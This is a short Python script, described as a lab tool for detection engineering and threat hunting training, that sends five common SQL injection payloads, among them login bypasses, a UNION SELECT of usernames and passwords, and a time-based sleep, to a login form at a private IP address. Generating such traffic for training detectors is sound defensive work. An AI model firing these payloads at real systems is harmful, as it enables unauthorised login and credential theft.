"""
SQL Injection Simulation Script
Purpose:
Simulate malicious SQL injection payloads sent to a vulnerable web endpoint.
Used for detection engineering / threat hunting training labs.
"""

import requests

TARGET_URL = "http://192.168.112.133/login"

payloads = [
    "' OR 1=1--",
    "' UNION SELECT username,password FROM users--",
    "' OR 'a'='a",
    "admin'--",
    "' OR sleep(5)--"
]

for p in payloads:
    data = {
        "username": p,
        "password": "test"
    }

    try:
        r = requests.post(TARGET_URL, data=data, timeout=3)
        print(f"[+] Payload sent: {p} | Status: {r.status_code}")
    except Exception as e:
        print(f"[!] Error sending payload {p} -> {e}")